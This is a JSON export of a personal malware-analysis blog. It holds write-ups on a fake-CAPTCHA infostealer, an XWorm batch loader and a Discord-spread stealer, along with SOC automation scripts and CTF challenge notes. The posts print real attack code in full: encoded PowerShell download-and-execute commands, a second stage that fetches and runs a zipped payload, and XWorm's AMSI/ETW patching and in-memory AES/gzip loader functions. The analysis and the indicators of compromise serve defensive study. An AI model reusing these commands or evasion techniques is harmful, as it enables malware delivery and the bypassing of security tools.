
[{"content":"This section contains all my blog articles!\n","date":"14 May 2025","externalUrl":null,"permalink":"/blog/","section":"Blog","summary":"","title":"Blog","type":"blog"},{"content":"In this article, we’ll break down how this failed phishing attempt occurred and what would have happened if it succeeded.\nDiscovery #\rI kept seeing articles about the phishing technique that utilises fake CAPTCHA pages. I wanted to know if I could randomly come across one of them in the wild, so I booted up my FlareVM and started browsing. I went to various websites, including travel agencies, social media, etc. (of course, without logging anywhere or inputting credentials), without AdBlock. I had planned a trip to visit a friend, so I thought, \u0026ldquo;Why not, I could check bus prices\u0026rdquo;. Lo and behold, a Google ad popped up when I attempted to open one of the websites, and it was a fake CAPTCHA phishing page, impersonating a Cloudflare page.\nThe page was later reported, and now it seems to have restricted access, showing a \u0026ldquo;Forbidden\u0026rdquo; error when trying to access it. The main domain, however, is still up and still shows hellow when accessed.\nLet\u0026rsquo;s examine the script, though:\nPowerShell.exe -ep bypass -enc KABJAG4AdgBvAGsAZQAtAHcAZQBiAHIAZQBxAHUAZQBzAHQAIAAtAFUAUgBJACAAJwBoAHQAdABwAHMAOgAvAC8AcwBoAG8AcgB0AGUAcgAuAG0AZQAvAFgATwBXAHkAVAAnACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApAC4AYwBvAG4AdABlAG4AdAAgAHwAaQBlAHgA -w 1powershell So what can we identify from this?\nThe command bypasses policy execution Runs a Base64 encoded command We can only see red flags until we see -w 1powershell. This was one of the fake CAPTCHA phishing techniques that has become more frequent in the past year. However, that WindowStyle flag argument was invalid, resulting in an error without executing the script. The correct version would have been -w 1, which would have been an alternate version of -WindowStyle Hidden.\nBut what if the issue was not there and we accidentally ran the correct command?\nAnalysis #\rStatic Analysis #\rRunning the command with the correct WindowStyle argument still resulted in an error due to an incorrect User Agent. That\u0026rsquo;s a second strike, so I decided to take a peek at what the encoded command does:\n(Invoke-webrequest -URI 'hxxps://shorter[.]me/XOWyT' -UseBasicParsing).content |iex\nThe command shows us that the script opens a shortened link. Checking that link in a sandbox, I identified that it contained the following command:\nInvoke-WebRequest -Uri \u0026quot;hxxps://bitly[.]cx/iddD\u0026quot; -OutFile \u0026quot;$env:TEMP\\ComponentStyle.zip\u0026quot;; Expand-Archive -Path \u0026quot;$env:TEMP/ComponentStyle.zip\u0026quot; -DestinationPath \u0026quot;$env:TEMP\u0026quot;; \u0026amp; \u0026quot;$env:TEMP\\crystall\\Crysta_x86.exe\u0026quot;\nSo let\u0026rsquo;s analyse it:\nIt accesses another shortened URL Drops an archive in the TEMP directory and unzips it Executes the payload I detonated the second stage payload, omitting the execution part of the script - the archive was secured, and it was time to create a snapshot.\nThe archive contained multiple files:\nA main executable Three DLL files a BXI and an RC file. When checked in VirusTotal, we can see that vendors cannot detect the main executable. We can also see that it was first submitted in 2011, and it is also signed and verified by Sonic Solutions, with the product being DivX Download Manager Service. While the binary is signed, it is likely vulnerable, making it possible to add malicious capabilities to it with the DLL files and the RC/BXI files.\nExamining the strings does not provide much useful information, though it shows us that the file is capable of registry and process manipulation. We can also see the signature provided by VeriSign.\nDynamic Analysis #\rDetonating the malware immediately shows a new process called MSBuild.exe, which appears to be associated with Flexera Software according to PEStudio. It also runs tcpvcon.exe, which is SysInternal\u0026rsquo;s TCPView tool.\nEventually, it also opens multiple Chrome processes, however, no visible windows or tabs were opened.\nThe malicious software creates a copy of itself within C:\\ProgramData\\PatchSystemCUS\\, while the tcpvcon.exe file was dropped in C:\\Users\\\u0026lt;UserName\u0026gt;\\AppData\\Roaming\\PatchSystemCUS\nWhen it comes to what the malware actually does, it appears to be a classic infostealer. The malicious software attempted to look for data files related to popular browsers like Google Chrome, Brave, Opera, CentBrowser, and many other region-specific browsers like Sputnik, etc.\nIt also targeted the TCPIP registries, enumerating hostname, DNSclient, and other keys in an attempt to steal details related to the machine\u0026rsquo;s connections. It also enumerated all directories within the virtual machine.\nFinally, I observed that the malicious sample went through the Uninstall registry keys, presumably to enumerate installed software and identify specific data \u0026ldquo;troves\u0026rdquo; or hindrances (such as security tools).\nThe file communicated with an external IP address at regular intervals, likely serving as a command and control (C2) server for data exfiltration by the malicious binary.\nConclusion #\rIn summary, phishing pages like these are far from rare—they can appear anywhere in the wild, even through ads served by reputable networks. Any unsuspecting user could run the malicious tool, risking data leaks or other serious consequences. We also can\u0026rsquo;t depend on attackers making mistakes, which highlights just how essential cybersecurity awareness is for both individuals and organisations.\nIoCs #\rHashes #\rdeb5bd989c9fdd5fe7f78f00a1216eb0 2d4fdba00b7f7b02408a8ea6c199037e e43ec4f0aa69a344fcb8431e60195f0f ff254c1778aefe5af06889f1f999dee3 IP Addresses #\r144.172.97[.]2 ","date":"14 May 2025","externalUrl":null,"permalink":"/blog/malware/captcha_this/","section":"Blog","summary":"","title":"CAPTCHA This!","type":"blog"},{"content":"Welcome to my website! I will use this website as a blog to document my research and analysis into various malware samples and how they affect systems. The papers I will include in the blog pages will contain thorough analysis of the samples and a forensic investigation into the effects it has on the affected machines.\nI have also included links to my accounts on various platforms such as LinkedIn, Github, and TryHackMe!\n- Kyd1ct\n","date":"14 May 2025","externalUrl":null,"permalink":"/","section":"kyd1ct.dev","summary":"","title":"kyd1ct.dev","type":"page"},{"content":"This section contains all my malware analysis articles!\n","date":"14 May 2025","externalUrl":null,"permalink":"/blog/malware/","section":"Blog","summary":"","title":"Malware Analysis","type":"blog"},{"content":"In this article, we’ll break down how this version of XWorm works, including:\nDeobfuscation: Attempt to deobfuscate the batch script.\nCapabilities: Identify what the script does and how it achieves it.\nDiscovery #\rThe malicious script was obtained through the popular threat-hunting community AbuseCH and their malware sample sharing platform Malware Bazaar. Credit to smica83 for sharing the sample.\nI first checked the website in VirusTotal and saw that multiple vendors had marked the script as malicious. The first submission occurred on April 18, 2025, which indicated a new version of the RAT. The sample was also known as 04cb.bat and fwgwng.bat.\nAnalysis #\rStatic Analysis #\rWhen I opened the batch script I noticed that it was heavily obfuscated. At first, I was confused but then I saw a pattern - there were random strings encased with % and in between them there were single characters that made up actual strings. After further research I found an article from Huntress - this is a common obfuscation technique used by attacks for batch scripts called DOS Obfuscation.\nI decided to dump the contents of the batch script within CyberChef and I used RegEx to deobfuscate the script. I first tested the regular expression (%[a-zA-Z0-9]+([^\\s%])[a-zA-Z0-9]+%), then removed the DOS Obfuscation:\nAfterwards, I removed the long variable and replaced it with set (Refer to the image within the Discovery section.)\nAfter the initial cleanup, the batch script contained some identifiable commands, a long string that appeared to be commented out (::), a base64 string, and a lot of variables that contained chunks of clear and base64 encoded text in random order.\nStarting with the identifiable commands, we can see the following:\nThe script first disables command echoing and launches the command line in a minimized window, specifying the full path of the script (drive, path, name, extension - %~dpnx0). It then exits the initial script and continues only with the new, minimized instance. Afterwards, a sourceFile variable is set, assigning the current drive, path, name, and extension of the script.\nThe next command (copy \u0026quot;\u0026quot; \u0026quot;\\dwm.bat\u0026quot; \u0026gt;nul\u0026quot;) appears to be malformed. It is possible that this was done with the intention to confuse the analyst. The copy command requires both source and destination, in this case, the source being an empty string. This invalidates the command. The output is also suppressed with \u0026gt;nul. Finally, the script enables delayed variable expansion (setlocal enabledelayedexpansion) - this will allow the variables within the batch script to change throughout the execution and are not fixed at parse time.\nAfterwards, the script assigns Base64 chunks to randomly named variables in a randomised order. This will be skipped for now.\nA long comment follows the first few random variables, but I was unable to decode/decrypt it. It is possible that the complete base64 string from the variables may have hints regarding this so this will be revisited afterwards.\nA lot more randomised variables follow before we reach a line that looks like this:\nThis is clearly a Base64 string which we can decode. Before we do this, however, we can see something interesting - the use of :::. What would that do? In Batch scripts : is a label and :: is a comment. Triple colon does not exist in Batch so this is most likely a label with the Base64 string as a comment. It is possible that the reconstructed command from the random variables could lead to this comment and extract the command.\nThe Base64 command has a script that defines a main function (Start-GenProcess) which takes two optional parameters $EnableVerbose and $DisableService. The script assigns commands to variables. They are encoded to bypass detection. The entire script was obfuscated as a whole, using variables to concatenate strings and bypass detection/make analysis slower.\nAs a whole, the script can do the following:\nRetrieve the address of GetProcAddress, and GetModuleHandle from user32.dll Retrieve address of AmsiInitialize function in amsi.dll Initialise Amsi and modify memory protection - 0xb8,0x0,0x00,0x00,0x00,0xC3 - mov eax, 0; ret Similar versions of this specific assembly have been used to bypass Amsi. In this case, it is passing 0x0, which is a standardised error code (S_OK) in COM.\nThe script also disables EtwEventWrite. Combining this with the VirtualProtect and the previously mentioned capabilities, allows the script to patch system files while evading security mechanisms and disabling logging. Finally, it checks if the $DisableService flag is set, indicating that service manipulation was successful.\nI tried to re-arrange the variables in the \u0026ldquo;correct order\u0026rdquo; but to no avail. The strings assigned to each variable appeared illegible even when decoded with Base64, though it may be because the string should be in the correct order. I noticed that anRy was repeated a lot throughout the assigned strings to the variables. Decoding this from Base64 showed jtr as a result. That did not look like an actual command or human-readable words so it was either a part of another variable or another obfuscation technique as initially thought.\nI looked through the script again and decided to run it but partially. Running the script with multiple echo commands did not help so I decided to comment out some parts of the script - the first four lines. Those lines were used to prevent the script from echoing and then moved the script to a file called dmw.bat. I thought - running the script without it being able to access dmw.bat should result in an error.\nAnd I was right, the script did throw an error. The problem is that it had appropriate error handling and immediately killed the command line window the moment it did not find dmw.bat. I bypassed this by piping the output to a text file and bingo:\nThis shows us that Base64 (with a UTF8 character set) was indeed being used to decode the payload. After decoding it, I saw that the command was filled with the string jtr placed at random - my initial assessment was correct.\nA quick Find/Replace aaaaand\u0026hellip; Done!\nNow we have the command and we can also see that parts of the payload were encrypted using AES. Thankfully, the script gives us all the details required to decrypt the payload.\nWe can immediately see that we have two main variables in the script:\n$yhuvl - at the very start. $ummwm - at the end of the command. The former contains the script nestled between @''@ - this is called a \u0026ldquo;Here-String\u0026rdquo;. Why is it useful in obfuscating malware - it allows someone to define a multi-line string that can include special characters, quotes, permits code-like formatting and does not require escape characters. The lack of escape quotes or other special characters outside of the \u0026ldquo;Here-String\u0026rdquo; makes AVs think that this is just one long string, not a script. It would be identical to writing Invoke-Expression $yhuvl but it avoids escaping and looks less suspicious. Afterwards, the value of the former variable is assigned to the latter (most likely another technique to evade detection) and invokes it. We then see the AES decryption function of the script. As previously mentioned, the key and IV are hardcoded so it will be easy to decrypt the payload:\nfunction sguqwhqqiwyksbn($param_var){ $aes_var=[System.Security.Cryptography.Aes]::Create(); $aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC; $aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7; $aes_var.Key=[System.Convert]::FromBase64String(\u0026#39;FmdNQA2gks1mlrKyKNSR0vv38TV6cw7qFyWAQeTTMSY = \u0026#39;); $aes_var.IV=[System.Convert]::FromBase64String(\u0026#39;SktSlarHcY7FWT3eTic31Q == \u0026#39;); $decryptor_var=$aes_var.CreateDecryptor(); $return_var=$decryptor_var.TransformFinalBlock($param_var, 0, $param_var.Length); $decryptor_var.Dispose(); $aes_var.Dispose(); $return_var; } The decrypted payload is then decompressed using gzip and loads .Net assembly to avoid writing on disk. The malware author also used reversed strings as another precaution to evade detection.\n# Gzip decompression function ecfuupouswjeayd($param_var){ $xmssvjjburmpipk=New-Object System.IO.MemoryStream(,$param_var); $yjlnnvyqememctm=New-Object System.IO.MemoryStream; $cqsezlszfevbldh=New-Object System.IO.Compression.GZipStream($xmssvjjburmpipk, [IO.Compression.CompressionMode]::Decompress); $cqsezlszfevbldh.CopyTo($yjlnnvyqememctm); $cqsezlszfevbldh.Dispose(); $xmssvjjburmpipk.Dispose(); $yjlnnvyqememctm.Dispose(); $yjlnnvyqememctm.ToArray(); } # Extracts payload from dwm.bat function dgqmijcnbsydkyc($param_var,$param2_var){ # \u0026#39;daoL\u0026#39;[-1..-4] -join \u0026#39;\u0026#39; - obfuscation (\u0026#34;Load\u0026#34; reversed string) #Loads .Net assembly directory instead of writing to disk to evade detection $afeiyatmkhywofr=[System.Reflection.Assembly]::(\u0026#39;daoL\u0026#39;[-1..-4] -join \u0026#39;\u0026#39;)([byte[]]$param_var); $xhhiowwdqygjfjs=$afeiyatmkhywofr.EntryPoint; $xhhiowwdqygjfjs.Invoke($null, $param2_var); } # \u0026#39;txeTllAdaeR\u0026#39;[-1..-11] -join \u0026#39;\u0026#39; - ReadAllText $host.UI.RawUI.WindowTitle = $hndfnypzcuzbtdz;$vsecrjyejquoiiz=[System.IO.File]::(\u0026#39;txeTllAdaeR\u0026#39;[-1..-11] -join \u0026#39;\u0026#39;)($hndfnypzcuzbtdz).Split([Environment]::NewLine); # Looks for a string that starts with :: - the main payload of the malware. foreach ($jhqdscvgswaaotm in $vsecrjyejquoiiz) { if ($jhqdscvgswaaotm.StartsWith(\u0026#39;:: \u0026#39;))\t{ $tyagyvqhchjjupt=$jhqdscvgswaaotm.Substring(3); break; } } To summarise, the script grabs the payload (the largest string that starts with :: as mentioned earlier), decodes it from Base64, then decrypts it using AES and the provided key (FmdNQA2gks1mlrKyKNSR0vv38TV6cw7qFyWAQeTTMSY = ) and IV (SktSlarHcY7FWT3eTic31Q == ) and uses gunzip to decompress it. The key and IV are not legible even after being decoded with Base64, most likely to confuse researchers.\nI used a recipe in CyberChef and successfully identified that this is a Gunzip file thanks to the magic number - 1f 8b 08\nCyberChef could not decompress the Gunzip file as it showed an invalid file signature error. With the help of ChatGPT, I wrote a script that decompressed it (and bypassed version dependencies as my Powershell version on the VM is 5.1) and extracted the executable.\nI used Floss on the payload to get an idea of its capabilities. It showed that the original name of the file is ijmnanslmt.tmp. Another hint that\u0026rsquo;s listed is mscoree.dll - a dynamic link library that loads .NET assembly in memory. This is most often seen in fileless malware and LOLBAS. It is also capable of running with the same permissions as the invoker.\nDynamic Analysis #\rI first attempted to execute the extracted PE, but it did not do much by itself. I did not observe any created files or connections. This is why I decided to revert to my previous snapshot and run the main batch file.\nThe script generated a lot of processes but most of them did not spark any curiosity. One chunk, however, revealed the malware\u0026rsquo;s persistence - it copied itself into the StartUp directory using a randomised name.\nI wondered why it did not show any other activity so I decided to check the PowerShell Transcription logs. It appeared that the script\u0026rsquo;s execution was terminated midway as it could not find a service provider. It is possible that it detected the Internet Service simulation suite (inetsim) that I normally use when analysing malware:\nConclusion #\rTo summarise, this batch file was heavily obfuscated. It has the capabilities to tamper with AMSI, disable logging, and load malicious payloads into memory. While the sample did pose a challenge, I was able to learn a lot of new techniques that will help me analyse and deobfuscate other samples in the future much more easily.\nIoCs #\rHashes #\rBatch File\nMD5: 258e7f6f287106dda8c97422a776e823 SHA256: e5269c1e1058ff5344999040ab4d02ad3cc2cb1020a2e1d9de9c62fed5e9123f PE Payload\nMD5: 6b18a0941cbfcbad0018988908fd1fbc SHA256: 9654c5497a6493585a1ff70a3d94d059c24e0403868b63a1cff80acc4cc3fcf9 IP Addresses #\r45.88.186[.]43 ","date":"21 April 2025","externalUrl":null,"permalink":"/blog/malware/xworm/","section":"Blog","summary":"","title":"XWorm","type":"blog"},{"content":"\rIntroduction #\rBrute-force alerts were a hefty task for me when I first started my job as a SOC Analyst. At the time, the triage process was entirely manual, which made it rather resource-intensive and time-consuming. In my eyes this approach was not an efficient use of time, so I took the initiative to automate it. I created two separate scripts - one took the generated log and used AbuseIPDB\u0026rsquo;s API to scan the IP addresses, while the other checked if they were already blocked within our environment.\nScripts #\rAbuseIPDB Checker #\rThe first script is used to automatically grab IP addresses from the log and check them using the AbuseIPDB API. The script takes a CSV file with the logs and filters all of the data to extract only valid IP addresses using RegEx. The script also sorts through duplicates and returns only unique entries.\n# Function to validate IP addresses function Validate-IP { param ( [string]$IP ) # Regular expression for validating an IP address (IPv4) $regex = \u0026#39;^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$\u0026#39; return $IP -match $regex } # Read the CSV file $csvData = Import-Csv -Path $inputFile # Extract valid IPs from the CSV $ipAddresses = $csvData | ForEach-Object { $_.PSObject.Properties.Value | ForEach-Object { $ip = $_ if (Validate-IP -IP $ip -and $ip -notmatch \u0026#39;^\\d+$\u0026#39;) { $ip } } } | Sort-Object -Unique The user also has to provide an output file which defaults to XLSX format. They also have an option to provide Abuse score threshold (-t), minimum days of retained reports (-md), or display the user manual (-help) if required.\nNote: The default threshold is set to 20% and the timeline of the fetched reports is 30 days.\rThe script utilises the API to obtain the IP Address, Confidence Score, ISP, Usage Type, Location, Total Reports, and potential Tor Node identification. The script shows appropriate errors to help with troubleshooting if any issues occur.\nFinally, it exports the results to Excel and has the functionality to overwrite files with the same name. If no IPs with Abuse Score over the threshold was found, an Excel sheet is not generated and the script displays a message.\nThe full script can be found on my GitHub Page.\nBlocklist Checker #\rThe second script is made specifically for a blocklist accessible through a URL but it can be altered to suit the user\u0026rsquo;s needs. The user has the following options:\n-i: Input file -o: Output file (optional, otherwise results will be displayed in the command line) -e: Specify if it should expect an Excel sheet. No flag is needed if the IPs are in a .txt file. -r: Displays unique IPs with semi-colon as a delimiter. Note: The -e flag is made to work with Excel sheets created by the former script. Some changes to the script will be necessary if your Excel sheets have a different layout.\rThe functionality is simple - it iterates through all the provided IPs and checks if they are present within the blocklist. Any missing addresses will be provided to the user so they can be promptly blocked.\nThe full script can be found on my GitHub Page.\n","date":"18 April 2025","externalUrl":null,"permalink":"/blog/miscellaneous/ip-block-automation/","section":"Blog","summary":"","title":"IP Block Automation","type":"blog"},{"content":"This section contains all articles related to automation and other personal projects that don\u0026rsquo;t fall under CTFs or Malware Analysis!\n","date":"18 April 2025","externalUrl":null,"permalink":"/blog/miscellaneous/","section":"Blog","summary":"","title":"Miscellaneous","type":"blog"},{"content":"\rIntroduction #\rBack in September 2024, BSides St. Petersburg took place. A friend of mine hosted the CTF and asked me if I wanted to participate by creating a few challenges. I ended up creating two forensics-based CTF challenges.\nCache Me If You Can This challenge highlights the complexity of Windows RAM data and teaches participants how much information can be extracted using memory forensics. By working through this task, players will dive into tools like Volatility to uncover hidden data within volatile memory. Greg\u0026rsquo;s Cryptic Thumbs-Up A multi-layered steganography challenge where players must find a hidden link within a GIF, which leads to a PDF file containing another concealed message. This exercise pushes participants to think outside the box and explore different techniques for uncovering hidden information within files. Challenges #\rCache Me If You Can #\rAs mentioned, this challenge focused on RAM forensics and aimed to teach the participants about how valuable volatile data can be for an investigation. I decided to focus on the following:\nSplit the flag in two halves and hide them in separate places. Encourage creativity - I used a variety of file names and tools to insert the data in memory. Environmental variables. Web browser history. Encryption of the flag. I started by creating a long flag. I first encoded it in Base64, then encrypted it using AES. The result was split in two halves.\nAfter the flag halves were done, I booted my VM and created multiple files - Notepad, Notepad++, vim. I opened them together with some other files in an attempt to trick the users. One of the files was named with the first half of the flag, while the other two contained either hints, or added as a deception.\nAfter this part was done, I grabbed the key used during the encryption, split it in half again, and added two separate environmental variables.\nThe second half of the flag was located within a PasteBin link and the participants had to extract it from a Google Chrome process dump. I opened multiple links to make it trickier for the participants if they did not consider looking for PasteBin.\nOnce the AES key and both halves of the flag were identified, the participants could use CyberChef to decrypt it and win the challenge.\nThe challenge can be accessed in my GitHub page, together with a full walkthrough.\nGreg\u0026rsquo;s Cryptic Thumbs-Up #\rThis challenge featured multi-layer steganography, attempting to challenge and trick the users. I decided to focus on the following:\nHide data within a GIF. GIF leads to a PDF with a hidden message - maybe it was \u0026ldquo;printed\u0026rdquo;? Decode the hidden message by hand or by using a toolkit. The idea of this challenge was to be simple, yet pose a challenge to users who have not previously dealt with printer dots.\nAs mentioned, the first part of the challenge was hidden data within a GIF. I split the GIF into frames and edited parts of a link (split into 4 parts) into those frames. The colour of the text was purposefully made to blend into the background. This to examine it frame by frame to obtain the link.\nThe link lead to a PDF file with a hidden message. Once the participants zoomed in, they could see the tiny dots that printers usually include. The dots were placed on the PDF using the Deda Toolkit. Participants could use the same toolkit to decode the data, or they could do it by hand if they had enough experience. The message hiddin in the dots contained the flag which consisted of date, time, and a serial number - information which is included by printers on each sheet of paper.\nOnce again, the challenge can be accessed in my GitHub page together with a full walkthrough.\n","date":"24 October 2024","externalUrl":null,"permalink":"/blog/ctf/stpete24-ctf/","section":"Blog","summary":"","title":"BSides STPete24","type":"blog"},{"content":"This section contains all my CTF articles!\n","date":"24 October 2024","externalUrl":null,"permalink":"/blog/ctf/","section":"Blog","summary":"","title":"CTFs","type":"blog"},{"content":"Recently, a fake game called StarsVaders started circulating on Discord. Similar to other malware on that platform, it aims to trick users into downloading malware instead of an actual game. This malware\u0026rsquo;s real goal is to steal information like browser history, tokens, and other personal data.\nIn this article, we’ll break down how StarsVaders works, including:\nStatic Analysis: Looking at the file properties and hidden details that reveal it’s not a real game.\nDynamic Analysis: Running StarsVaders in a test environment to see what it tries to do on the system.\nAlong the way, we’ll use tools like FlareVM, VirusTotal, and Hybrid Analysis to help us uncover the true nature of this fake game.\nBy the end, you’ll see how attackers hide malware in plain sight—and how to spot it.\nDiscovery #\rThe phishing link was obtained through a friend, who mentioned the scam in a mutual Discord server. The messages were sent by a friend of theirs but they seemed suspicious. I asked them for the link and started with the analysis.\nI first checked the website in VirusTotal, who.is, and URLScan and saw that the it was marked as malicious by a few vendors. The domain was created in September 2024, which indicated potential suspicious activity.\nWhen I opened the website on my VM, I noticed a large \u0026ldquo;Download\u0026rdquo; button on top of the page. It also had various screenshots of the alleged game. I looked into this and identified that they used images from a game called The Braves while the malware was attempting to impersonate an upcoming game called StarVaders.\nThe previously mentioned \u0026ldquo;Download\u0026rdquo; button utilised Discord\u0026rsquo;s CDN to host and spread the malicious file. The attackers used this as it looks benign due to gamers being very familiar with Discord. This also makes it easier for the adversary as they do not need to spin up any extra infrastructure to spread the files.\nAnalysis #\rStatic Analysis #\rAfter downloading the archive, I opened it and found an executable within it. I attempted to extract it, but the archive required a password to complete the extraction. I would assume the attackers provided the password to the victims. I had no such luck as my friend did not fall for the phishing attempt.\nI decided to use John The Ripper\u0026rsquo;s module called zip2john which is used for password protected zip files. Thankfully, the password was within the rockyou.txt password dictionary file. The password was revealed to be beta.\nI used FLOSS to extract strings from the file in order to obtain an initial understanding of its capabilities. FLOSS is a great too for such tasks as it can identify obfuscation and attempt to make it human-readable. In this case, since the file was too big, FLOSS essentially worked as the Linux binary strings. Observing the output indicated that the file is capable of manipulating the user\u0026rsquo;s clipboard and registries.\nRunning the installer dropped multiple other binaries. FLOSS showed similar results on the other files.\nDynamic Analysis #\rAs mentioned, the installer dropped more binaries. The files were located in the following directories:\nAppData\\Local\\starsvaders-updater AppData\\Local\\Programs\\StarsVaders The former directory contained one file named installer.exe. The file was identical to the initial installer StarsVaders Setup 2.0.0.exe which would indicate attempts at persistence. I, however, could not identify any indicators of persistence within the registries and/or scheduled tasks.\nThe other location featured more files:\nStarsVaders.exe - main executable. Uninstall StarsVaders.exe - alleged uninstaller. Chrome/Chromium-related files. Electron-related files. elevate.exe - within the resources directory. The main executable, StarsVaders.exe, contained the main functionality of the malware. It attempted to steal data from the user\u0026rsquo;s browser (cookies, history, etc.). It also attempted to access files within the Discord directories within AppData. The files covered all versions of Discord (Discord, Canary, PTB, Development) and even the custom version of the application called BetterDiscord. Examining the process tree showed that StarsVaders.exe ran two commands multiple times:\npowershell.exe /c \u0026#34;Get-CimInstance -className win32_process | select Name,ProcessId,ParentProcessId,CommandLine,ExecutablePath\u0026#34; C:\\Windows\\system32\\cmd.exe /d /s /c \u0026#34;powershell -Command \u0026#34;\u0026amp; {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(\u0026#39;The application was unable to start correctly (0xc000007b). Click OK to close the application.\u0026#39;, \u0026#39;Application Error\u0026#39;, [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)}\u0026#34;\u0026#34; The former command functions similarly to pstree, while the latter shows a fake error message to trick the victim.\nThe uninstaller removed the files from the main directory but the installer within AppData\\Local\\starsvaders-updater remained.\nThe final file of interest, elevate.exe, is a file used by Electron applications. It does what the name suggests - it elevates the application\u0026rsquo;s privileges, providing it with higher access to the OS.\nFinally, I decided to test how the application exfiltrates the obtained data. I did this by running inetsim and wireshark on a Linux VM and placing both VMs on the same Host-Only network adapter. The malware did not appear to download any additional payloads but it made a connection to a URL called unity-api[.]net. I could not directly access the domain due to CloudFlare blocking my attempts. This prevents me from further researching the malware\u0026rsquo;s capabilities. While this URL might look benign, VirusTotal and who.is indicated that it was created on the 31st of August. It would highly unlikely that Unity are hosting their API on a nearly brand-new domain.\nConclusion #\rAfter the analysis, I gathered all of the evidence and reported the URLs to the providers which were used to host the websites/servers.\nAs of today, the archive file from the Discord CDN is unavailable. IoCs #\rLinks #\rwww.starsvaders[.]com - VirusTotal\nunity-api[.]net - VirusTotal\nHashes #\rStarsVaders Setup 2.0.0.exe ea2b7e73659c251243f33999c5b0e12bf6c180f44ff545a02acb7164eda8cd83 StarsVaders.exe\n4d05d719f2af8bcb4e706d7b01ed54739fc63dd20579b17ef34c78e9a2e57a6e StarsVaders.rar\n9532a0f831316fd17b4089afc87950c472ab8ed5b58e0b2765d1d4fe8557557e Uninstall StarsVaders.exe\n47b6d08004a15d0bc8ac07f1a03d487cf287203e71024d438b2f503017ef8e6a elevate.exe\n9b1fbf0c11c520ae714af8aa9af12cfd48503eedecd7398d8992ee94d1b4dc37 installer.exe ea2b7e73659c251243f33999c5b0e12bf6c180f44ff545a02acb7164eda8cd83\n","date":"24 October 2024","externalUrl":null,"permalink":"/blog/malware/starsvaders-discord-malware/","section":"Blog","summary":"","title":"StarsVaders or Spyware?","type":"blog"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]